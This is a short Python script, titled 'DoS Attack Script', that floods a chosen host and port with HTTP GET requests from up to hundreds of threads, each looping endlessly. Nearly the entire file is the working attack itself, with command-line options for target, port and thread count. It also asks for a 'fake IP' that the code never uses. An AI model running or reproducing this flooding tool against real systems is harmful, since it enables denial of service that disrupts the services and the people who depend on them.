import socket
import threading
import argparse

parser = argparse.ArgumentParser(description='DoS Attack Script')
parser.add_argument('-t', '--target', required=True, help='Target IP address or domain name')
parser.add_argument('-fip', '--fake-ip', required=True, help='Fake IP address')
parser.add_argument('-p', '--port', type=int, required=True, help='Target port number')
parser.add_argument('-n', '--num-threads', type=int, default=500, help='Number of threads (default: 500)')

args = parser.parse_args()

target = args.target
fake_ip = args.fake_ip
port = args.port
num_threads = args.num_threads

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            print("Invalid target address. Please provide a valid IP address or domain name.")
            return

        s.connect((target_ip, port))
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
        s.send(request.encode('ascii'))
        s.close()

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
